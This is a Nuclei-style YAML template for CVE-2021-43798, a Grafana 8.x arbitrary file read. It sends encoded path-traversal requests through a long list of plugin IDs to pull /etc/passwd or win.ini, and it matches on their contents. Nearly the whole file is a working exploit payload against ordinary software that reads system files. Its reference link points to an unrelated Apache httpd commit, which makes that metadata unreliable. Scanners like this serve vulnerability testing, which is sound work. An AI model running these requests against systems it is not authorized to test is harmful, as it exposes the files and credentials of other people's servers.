id: Grafana任意文件读取（CVE-2021-43798）

info:
  name: Grafana 8.x  - File-Read
  author: JiuBan
  severity: high
  description: Grafana 8.x  - File-Read
  reference:
    - https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782
  tags: cve,cve2021,Grafana
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.50
    cve-id: CVE-2021-43798

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/{{plugin-id}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
      - "{{BaseURL}}/public/plugins/{{plugin-id}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini"
      - "{{BaseURL}}/public/plugins/{{plugin-id}}/#/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
      - "{{BaseURL}}/public/plugins/{{plugin-id}}/#/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini"

    payloads:
      plugin-id:
        - alertGroups
        - alertlist
        - alertmanager
        - annolist
        - barchart
        - bargauge
        - canvas
        - cloudwatch
        - dashboard
        - dashlist
        - debug
        - elasticsearch
        - gauge
        - geomap
        - gettingstarted
        - grafana
        - grafana-azure-monitor-datasource
        - grafana-clock-panel
        - grafana-simple-json-datasource
        - graph
        - graphite
        - heatmap
        - histogram
        - icon
        - influxdb
        - jaeger
        - live
        - logs
        - loki
        - mixed
        - mssql
        - mysql
        - news
        - nodeGraph
        - opentsdb
        - piechart
        - pluginlist
        - postgres
        - prometheus
        - stackdriver
        - stat
        - state-timeline
        - status-history
        - table
        - table-old
        - tempo
        - testdata
        - text
        - timeseries
        - welcome
        - xychart
        - zipkin

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0"
          - "for 16-bit "